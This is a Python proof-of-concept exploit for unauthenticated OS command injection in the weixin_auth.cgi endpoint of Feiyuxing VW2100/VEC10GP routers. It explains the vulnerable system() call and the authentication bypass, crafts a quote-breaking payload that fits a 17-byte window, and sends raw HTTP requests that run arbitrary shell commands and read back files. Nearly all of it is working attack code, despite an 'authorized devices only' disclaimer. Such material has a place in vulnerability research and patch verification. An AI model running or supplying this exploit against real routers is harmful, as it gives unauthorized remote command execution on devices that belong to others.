#!/usr/bin/env python3
"""Unauthenticated OS command injection PoC for /weixin_auth.cgi (VROS).

Target: Feiyuxing (飞鱼星) VW2100 / VEC10GP router web admin ("webserver" CGI,
served by the vendor-patched thttpd on the web admin port).

Only use on your own or explicitly authorized devices.

Root cause (handle_wechat_cn_wifi @ 0x4D2B70):

    extend = procgi("extend", LoadInput());
    if (!memcmp(extend, "volanswechatconnwifi", 20)) {
        /* 17 bytes of extend[20..36] copied into a buffer ... */
        snprintf(cmd, 512,
            "echo 'weixin_authed %s %d' > /proc/weixin_config &",
            buf, inet_addr(REMOTE_ADDR));
        system(cmd);                      /* @ 0x4D2DF8, no escaping */
    }

The 17-byte window ends up inside single quotes, so a leading `'` breaks
out of the quoted string. `#` comments out the trailing part of the
command line. No cookie / login is required: main() whitelists
argv[1] == "weixin_auth" and skips the session check entirely.

Window budget: 17 bytes total =>  ';CMD;#'  where CMD can be up to 13 chars.

Longer output can be staged to a file and read back in a second request:
    -c 'id>/tmp/p'      then      --read /tmp/p
"""
import argparse
import socket
import sys

SCRIPT = "weixin_auth"
PREFIX = "volanswechatconnwifi"
WINDOW = 17


def build_request(ip, port, body):
    headers = [
        f"POST /{SCRIPT}.cgi HTTP/1.1",
        f"Host: {ip}:{port}",
        "Accept: */*",
        "Accept-Encoding: identity",
        "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: Mozilla/5.0",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode() + body


def http_exchange(ip, port, body, timeout, show_request):
    request = build_request(ip, port, body)
    if show_request:
        print("[*] raw request:")
        print(request.decode("utf-8", "replace"))
    with socket.create_connection((ip, port), timeout=timeout) as sock:
        sock.sendall(request)
        sock.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    return b"".join(chunks)


p = argparse.ArgumentParser(description="authorized PoC")
p.add_argument("ip")
p.add_argument("port", type=int)
p.add_argument("-c", "--command", default="id", help="shell command, max 13 chars (default: id)")
p.add_argument("--read", metavar="FILE", help="read FILE from the target (equivalent to -c 'cat<FILE')")
p.add_argument("--timeout", type=int, default=10)
p.add_argument("--show-request", action="store_true")
a = p.parse_args()

cmd = f"cat<{a.read}" if a.read else a.command
payload = f"';{cmd};#"
if len(payload) > WINDOW:
    print(f"[!] payload {payload!r} is {len(payload)} bytes; window is {WINDOW} bytes "
          f"(command limited to {WINDOW - 4} chars)")
    print("    stage large output to a file and read it back:")
    print("      -c 'cmd>/tmp/p'   then   --read /tmp/p")
    sys.exit(2)

body = f"extend={PREFIX}{payload}".encode()

print(f"[*] endpoint : POST /{SCRIPT}.cgi")
print(f"[*] command  : {cmd!r}")
print(f"[*] window   : {payload} ({len(payload)}/{WINDOW} bytes)")
print(f"[*] shell    : echo 'weixin_authed ';{cmd};# <ip>' > /proc/weixin_config &")
print(f"[*] body     : {body.decode()}")

response = http_exchange(a.ip, a.port, body, a.timeout, a.show_request)
print(f"[*] response size: {len(response)} bytes")
print("[*] raw response:")
print(response.decode("utf-8", "replace"))
